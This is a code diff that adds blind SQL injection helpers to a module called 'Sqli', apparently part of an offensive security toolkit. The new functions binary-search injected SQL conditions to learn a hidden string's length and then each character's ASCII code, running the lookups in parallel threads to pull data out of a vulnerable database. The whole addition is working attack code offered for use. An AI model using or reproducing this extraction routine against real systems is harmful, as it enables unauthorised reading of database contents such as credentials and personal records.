@@ -403,3 +403,57 @@ class Sqli(BaseModule):
                     print_error("Empty result")
             except Exception as exc:
                 print_error(f"Error: {exc}")
+
+
+def sqli_blind_search_int(gt_probe, expr: str, hi: int) -> int:
+    """Binary search using ``gt_probe(sql_fragment) -> bool`` (expr compared to integers)."""
+    lo = 0
+    while lo < hi:
+        mid = (lo + hi) // 2
+        if gt_probe(f"({expr})>{mid}"):
+            lo = mid + 1
+        else:
+            hi = mid
+    return lo
+
+
+def sqli_blind_extract_string(
+    true_probe,
+    gt_probe,
+    errors_probe,
+    subquery: str,
+    *,
+    threads: int = 8,
+    max_length: int = 1024,
+) -> Optional[str]:
+    """
+    Extract a scalar string via boolean blind SQLi.
+
+    *true_probe(cond)*, *gt_probe(expr)*, *errors_probe(subquery)* are callables.
+    """
+    from concurrent.futures import ThreadPoolExecutor
+
+    if errors_probe and errors_probe(subquery):
+        return None
+
+    length = sqli_blind_search_int(gt_probe, f"LENGTH(({subquery}))", max_length)
+    if length <= 0:
+        return ""
+    if length >= max_length:
+        return None
+
+    chars = [None] * length
+
+    def pull(pos: int) -> None:
+        code = sqli_blind_search_int(
+            gt_probe,
+            f"ASCII(SUBSTRING(({subquery}),{pos},1))",
+            127,
+        )
+        chars[pos - 1] = chr(code) if code else ""
+
+    workers = max(1, int(threads))
+    with ThreadPoolExecutor(max_workers=workers) as pool:
+        list(pool.map(pull, range(1, length + 1)))
+
+    return "".join(c or "" for c in chars)
